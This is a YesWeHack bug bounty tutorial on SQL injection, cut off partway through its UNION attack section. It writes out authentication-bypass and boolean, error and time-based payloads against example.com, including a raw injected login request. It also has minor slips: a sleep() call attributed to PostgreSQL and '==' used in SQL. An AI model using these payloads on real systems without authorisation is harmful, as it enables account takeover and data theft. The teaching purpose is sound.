# SQL injection for Bug Bounty hunters | YesWeHack

Source: https://www.yeswehack.com/learn-bug-bounty/vulnerability-vectors-sql-injection

## Table of Contents

- SQLi: The ultimate Bug Bounty guide to exploiting SQL injection vulnerabilities
- What is SQL?
- Understanding SQL Injection – definition, impact and Bug Bounty earnings
- Security impact of SQL injection attacks
- Why SQLi vulnerabilities persist despite improved protections
- Simple SQLi: detecting vulnerabilities by analyzing responses
- SQL statement cheat sheet
- SELECT statement injection
- UPDATE statement injection
- DELETE statement injection
- INSERT statement injection
- Boolean-based SQL injection
- UNION SQLi attacks
- Error-based SQLi attacks
- Advanced techniques: blind SQL injection
- Time-based SQL injection
- Time-based SQLi scenario
- Exploitation workflow of a time-based SQLi
- Out-of-band (OOB) SQL injection via DNS/HTTP Callbacks
- Out-of-band SQLi scenario

## Content

Behind every SQL query hides an opportunity: a carefully crafted payload can elicit sensitive data long after obvious error messages have been addressed.
In this guide, we explain basic and advanced SQL injection (SQLi) techniques, including blind SQLi, time-based attacks and out-of-band (OOB) callbacks.
You'll learn how to tailor payloads to the SQL statement in play, incorporate them into your Bug Bounty workflow, and detect and exploit SQLi vulnerabilities – even in hardened systems.
What is SQL?
SQL stands for
Structured Query Language
. It’s the primary way of interacting with relational databases, which store data in rows and columns (tables), like a spreadsheet. SQL commands such as
SELECT
,
INSERT
,
UPDATE
, and
DELETE
allow developers to efficiently organise, retrieve and modify information.
For example, if a website needs to check a user’s token, it might run a query like:
1
SELECT
*
FROM
users
WHERE
username
=
'guest'
AND
token
=
'sometoken'
;
This tells the database: “Find every row in the
users
table where the
username
is guest and the token is
sometoken
.”
By splitting data into clearly defined tables, SQL makes it easy for developers to build a wide variety of features, from simple user profiles to recommendation engines – which is why it powers everything from personal blogs to enterprise applications. Learning about various SQL statement structures will help you tailor payloads to your target.
Understanding SQL Injection – definition, impact and Bug Bounty earnings
SQL injection (SQLi) occurs when untrusted input is embedded into an SQL query in a way that alters its intended logic – often leading to unauthorised data access, modification or deletion. First
documented in the late 1990s
, SQLi bugs have become somewhat less prevalent over time due to the use of parameterised queries, ORMs (Object-Relational Mappers) and secure frameworks. However, they
remain common
and are frequently classed as high or critical severity vulnerabilities – earning significant rewards for Bug Bounty hunters.
As an ethical hacker, you will frequently encounter endpoints whose user-supplied parameters map directly to backend database queries. Have you ever noticed an error, strange behaviour or inconsistent response times after submitting unexpected characters or timing-based payloads? Those quirks are your first hint that an endpoint might be injectable.
In the modified query below, A hunter sets
username = 'z'
(so likely false) and appends an
OR 1=1
clause that is always true, followed by a comment sequence that ignores the rest of the statement, thereby bypassing the token check:
1
SELECT
*
FROM
users
WHERE
username
=
'z'
OR
1
=
1
--
-
' AND token = '
sometoken'
;
This modifies the original SQL query structure, making the
WHERE
clause always evaluate to true.
This visualisation shows how SQL injection works:
Security impact of SQL injection attacks
Successful SQL injection attacks enable attackers to interact directly with the application’s backend database, which can cause operational disruption or large-scale data breaches. Depending on privileges and security context, attackers can:
Exfiltrate data
Modify or delete records
Escalate privileges
Achieve remote code execution (RCE) by abusing file-write or upload capabilities to inject a malicious payload
Why SQLi vulnerabilities persist despite improved protections
Despite the introduction of defences such as prepared statements and Object–Relational Mappers (ORMs), SQL injection vulnerabilities continue to persist in legacy systems as well as surface in modern applications. Take
CVE-2022-21661
, which affected the WP_Query function used by WordPress to sanitise SQL queries with prepared statements. Due to improper handling of user input, SQL injection was still possible.
Simple SQLi: detecting vulnerabilities by analyzing responses
Let’s kick off with some comparatively simple techniques. Consider a website that leverages SQL for product search functionality.
A query for a non-existent product should return no results:
1
http
:
/
/
example
.
com
/
search
?
query
=
notexist
If the application is vulnerable to SQLi, a boolean-based payload that always returns true could return unexpected results:
1
http
:
/
/
example
.
com
/
search
?
query
=
notexist'
OR
true
--
-
Alternatively, injecting a single quotation mark (') may trigger a database error or 500 Internal Server Error, indicating improper input sanitisation:
1
http
:
/
/
example
.
com
/
search
?
query
=
notexist'
Time-based SQLi, a more complicated variant, abuses delays in query execution. For example, in PostgreSQL, the following payload forces a four-second delay if vulnerable:
1
http
:
/
/
example
.
com
/
search
?
query
=
noexist'
OR
sleep
(
4
)
--
-
ALSO IN THIS SERIES
The ultimate Bug Bounty guide to exploiting CSRF vulnerabilities
SQL statement cheat sheet
SQL injection vulnerabilities can occur wherever user input is incorporated into SQL queries. It’s wise to manually pinpoint where and how your input is handled by the database before you launch automated tools.
Each clause, such as
WHERE, VALUES
and
SET
, has its own escape hatch. Knowing your injection context determines whether you break out with a quote, parenthesis or
UNION
.
SELECT statement injection
Fetching an article based on its id:
1
SELECT
author
,
article
FROM
posts
WHERE
postid
=
<
payload_1
>
;
Searching for products in an e-commerce web application:
1
SELECT
item
,
price
FROM
products
WHERE
item
LIKE
'%<payload_1>%'
OR
description
LIKE
'%<payload_2>%'
;
UPDATE statement injection
Update blog post comment:
1
UPDATE
comments
SET
comment
=
'<payload_1'
>
WHERE
id
=
<
payload_2
>
AND
owner
=
'<payload_3>'
;
DELETE statement injection
Delete file from
users
archive:
1
DELETE
FROM
files
WHERE
id
=
<
payload_1
>
AND
owner
=
'<payload_2>'
;
INSERT statement injection
Register a new user:
1
INSERT
INTO
users
(
username
,
email
,
password
)
2
VALUES
(
'<payload_1>'
,
'<payload_2>'
,
'<payload_3>'
)
;
Boolean-based SQL injection
Boolean-based SQL injection is a form of blind SQLi, which means attackers sends crafted inputs that cause the database to return either
true
or
false
conditions. By comparing the application’s behaviour for true versus false conditions, they can infer what’s happening behind the scenes and gradually extract data.
Imagine a login form where the user submits a login and username and password, as demonstrated by this raw HTTP request:
1
POST
/
login
HTTP
/
1.1
2
Host
:
example
.
com
3
Content
-
Type
:
application
/
x
-
www
-
form
-
urlencoded
4
Content
-
Length
:
29
5
6
username
=
guest
&
password
=
guest
And behind the scenes, the application runs this query:
1
SELECT
username
FROM
users
WHERE
username
==
'<payload_1>'
AND
password
==
'<payload_2>'
;
An attacker might try something like this:
1
POST
/
login
HTTP
/
1.1
2
Host
:
example
.
com
3
Content
-
Type
:
application
/
x
-
www
-
form
-
urlencoded
4
Content
-
Length
:
29
5
6
username
=
noexist'
OR
1
=
1
--
-
&
password
=
guest
This would modify the SQL query to:
1
SELECT
username
FROM
users
WHERE
username
==
'noexist'
OR
1
=
1
--
-
' AND password == '
<
payload_2
>
'
;
The condition
OR 1=1
obviously always evaluates to true. This renders the username check irrelevant and, combined with the SQL comment sequence
-- -
, causes the database to ignore the rest of the query. A successful SQLi here allows the attacker to log into the first user record – usually the administrator’s account.
UNION SQLi attacks
UNION
-based SQLi attacks leverage the
UNION
operator to trick a website into combining the results of multiple
SELECT
queries – allowing attackers to extract sensitive data such as usernames, emails or passwords. The attack only works if the queries have matching column counts and compatible data types.
Imagine a website has this URL:
1
https
:
/
/
example
.
com
/
product
?
id
=
2
And behind the scenes, the application runs:
1
SELECT
name
,
price
FROM
products
WHERE
id
=
2
;
If this input is not properly sa